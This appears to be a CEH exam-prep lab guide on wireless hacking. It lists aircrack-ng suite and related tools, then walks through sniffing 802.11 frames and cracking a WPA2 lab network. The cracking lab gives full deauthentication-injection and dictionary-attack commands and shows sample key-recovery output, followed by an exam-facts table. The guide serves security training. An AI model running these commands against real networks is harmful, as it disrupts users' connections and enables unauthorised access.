# Module 16: Hacking Wireless Networks - Lab Guide

## Tools Used & Purpose

- **Aircrack-ng**: WPA/WPA2 Pre-Shared Key (PSK) cracking using dictionary wordlists against captured 4-way handshakes.
- **Airmon-ng**: Enabling and disabling monitor mode on wireless network interface cards (NICs).
- **Airodump-ng**: Capturing 802.11 frames, discovering wireless BSSIDs/ESSIDs, channels, and isolating client MACs.
- **Aireplay-ng**: Injecting wireless frames, executing deauthentication attacks to force client handshakes.
- **Airbase-ng**: Creating fake Access Points (Evil Twin, Rogue AP) to intercept client wireless connections.
- **Kismet**: Passive wireless network detector, packet sniffer, and IDS for 802.11 traffic.
- **Wireshark**: Dissecting wireless 802.11 beacon frames, probe requests, and 4-way handshake exchanges.
- **Wifite2**: Automated wireless auditing tool for chaining WPS, WPA handshakes, and PMKID attacks.
- **Fern Wi-Fi Cracker**: Python GUI tool for wireless encryption cracking and session hijacking.
- **Reaver / Bully / PixieWps**: Exploiting Wi-Fi Protected Setup (WPS) PIN brute-force and offline Pixie Dust vulnerabilities.
- **Wifiphisher / WiFi-Pumpkin**: Rouge AP framework for automated rogue captive portal credential harvesting.
- **NetSpot**: Wireless site survey and signal coverage mapping tool.

---

## 6. Hands-On Practical Labs Walkthrough

### Lab 1: Perform Wireless Traffic Analysis

#### Task 1: Find Wi-Fi Networks and Sniff Wi-Fi Packets using Airmon-ng and Wireshark

- <b>Environment:</b>
  - Attacking Machine: Parrot Security (<code>10.10.1.13</code>).
  - Wireless Adapter: Linksys 802.11g WLAN USB Adapter (<code>wlx00e02d886189</code> / <code>wlan0</code>).
  - Tools: <code>airmon-ng</code>, <code>airodump-ng</code>, <code>Wireshark</code>.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Identify Wireless Hardware & Terminate Conflicting Daemons:</b>
     - Open Terminal on Parrot Security:
       ```bash
       iwconfig
       ```
     - Identify wireless interface: <code>wlx00e02d886189</code> (or <code>wlan0</code>).
     - Kill conflicting networking services that interfere with packet injection:
       ```bash
       airmon-ng check kill
       ```
  2. <b>Enable Monitor Mode:</b>
     - Put the wireless card into promiscuous RF monitor mode:
       ```bash
       airmon-ng start wlx00e02d886189
       ```
     - Note the newly spawned monitor interface: <code>wlan0mon</code>.
  3. <b>Discover Airborne Wireless Networks:</b>
     - Run <code>airodump-ng</code> to scan the RF environment across all channels:
       ```bash
       airodump-ng wlan0mon
       ```
     - Observe real-time discovery of Access Points:
       - Target SSID: <code>ECC LABS</code>
       - BSSID: <code>00:14:6C:7E:40:80</code>
       - Channel: <code>6</code>
       - Encryption: <code>WPA2 CCMP PSK</code>
  4. <b>Capture and Analyze Frames in Wireshark:</b>
     - Launch Wireshark and select <code>wlan0mon</code> as the capture interface.
     - Apply Wireshark 802.11 display filters to isolate specific frame types:
       - Filter Beacon frames: <code>wlan.fc.type_subtype == 8</code>
       - Filter Probe Requests: <code>wlan.fc.type_subtype == 4</code>
       - Filter Deauthentication frames: <code>wlan.fc.type_subtype == 12</code>
     - Expand the IEEE 802.11 wireless management frame details to view supported data rates, RSN Information Elements, and cipher suites.

---

### Lab 2: Perform Wireless Attacks

#### Task 1: Crack a WPA2 Network using Aircrack-ng

- <b>Environment:</b>
  - Attacking Machine: Parrot Security (<code>10.10.1.13</code>).
  - Interface: <code>wlan0mon</code>.
  - Target Network: <code>ECC LABS</code> (BSSID: <code>00:14:6C:7E:40:80</code>, Channel: <code>6</code>).
  - Associated Client MAC: <code>00:1A:E9:9D:61:A0</code>.
  - Wordlist: <code>/home/attacker/wordlist.txt</code>.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Lock Airodump-ng onto Target Channel & BSSID:</b>
     - Launch focused packet capture on channel 6 writing to <code>/home/attacker/capture</code>:
       ```bash
       airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w /home/attacker/capture wlan0mon
       ```
     - Confirm an active client (<code>00:1A:E9:9D:61:A0</code>) is associated with the target BSSID.
  2. <b>Execute Active Deauthentication Injection:</b>
     - Open a second Terminal window.
     - Inject 11 deauthentication frames to break the client's connection, forcing an automatic 4-way re-handshake:
       ```bash
       aireplay-ng -0 11 -a 00:14:6C:7E:40:80 -c 00:1A:E9:9D:61:A0 wlan0mon
       ```
  3. <b>Verify 4-Way Handshake Capture:</b>
     - Switch back to the <code>airodump-ng</code> terminal.
     - Observe the notification in the top right corner:
       ```txt
       [ WPA handshake: 00:14:6C:7E:40:80 ]
       ```
     - Press <code>Ctrl + C</code> to stop capturing.
  4. <b>Execute Offline Dictionary Attack using Aircrack-ng:</b>
     - Run <code>aircrack-ng</code> supplying the capture file and dictionary:
       ```bash
       aircrack-ng -w /home/attacker/wordlist.txt -b 00:14:6C:7E:40:80 /home/attacker/capture-01.cap
       ```
     - Aircrack-ng computes candidate PTKs and compares them against the captured MIC.
     - Recovery output:
       ```txt
       KEY FOUND! [ 12345678 ]
       Master Key     : 9B 4C 6E ...
       Transient Key  : 7F 2A 11 ...
       ```
     - The WPA2 passphrase is recovered successfully.

---

## 7. High-Frequency Exam Indicators & Key Memory Anchors

```javascript
+----------------------------------------------------------------------------------------------------+
|                                  CEH v13 EXAM CRITICAL FOCUS POINTS                                |
+----------------------------+-----------------------------------------------------------------------+
| Exam Question Theme        | Key Answer / Official EC-Council Exam Concept                         |
+----------------------------+-----------------------------------------------------------------------+
| 802.11 Non-Overlapping     | Channels 1, 6, and 11 are the only non-overlapping channels in 2.4 GHz|
+----------------------------+-----------------------------------------------------------------------+
| WEP Vulnerability          | 24-bit IV transmitted in cleartext; leads to IV reuse & RC4 key leak  |
+----------------------------+-----------------------------------------------------------------------+
| WPA vs WPA2 Encryption     | WPA uses RC4 with TKIP (48-bit IV); WPA2 uses AES with CCMP (128-bit) |
+----------------------------+-----------------------------------------------------------------------+
| WPA3 Authentication        | SAE (Simultaneous Authentication of Equals / Dragonfly handshake)     |
|                            | Provides forward secrecy and immunity to offline dictionary attacks.  |
+----------------------------+-----------------------------------------------------------------------+
| WPA3 Protected Frames      | Protected Management Frames (PMF / IEEE 802.11w) are MANDATORY;       |
|                            | completely stops deauthentication and disassociation DoS attacks.    |
+----------------------------+-----------------------------------------------------------------------+
| WPS Vulnerability          | 8-digit PIN checked in halves (4+3+1), reducing space to 11,000 keys;  |
|                            | cracked by Reaver / Bully; Pixie Dust exploits weak PRNG in chipset.  |
+----------------------------+-----------------------------------------------------------------------+
| PMKID Attack               | Extracts PMKID from RSN IE in message 1 of handshake; crackable       |
|                            | without requiring an active connected client station.                 |
+----------------------------+-----------------------------------------------------------------------+
| Rogue AP vs Evil Twin      | Rogue AP is unauthorized physical AP connected to wired internal port;|
|                            | Evil Twin is software AP cloning SSID/BSSID on stronger RF signal.    |
+----------------------------+-----------------------------------------------------------------------+
| Bluetooth Bluebugging      | Gives attacker total control over phone (calls/SMS) via AT commands;  |
| Bluesnarfing vs Bluejack   | Bluesnarfing steals data; Bluejacking only sends unsolicited messages |
+----------------------------+-----------------------------------------------------------------------+
| Aircrack-ng Suite Roles    | airmon-ng (monitor mode), airodump-ng (sniffing), aireplay-ng (inject)|
|                            | aircrack-ng (cracking keys), airbase-ng (host fake AP).               |
+----------------------------+-----------------------------------------------------------------------+
```
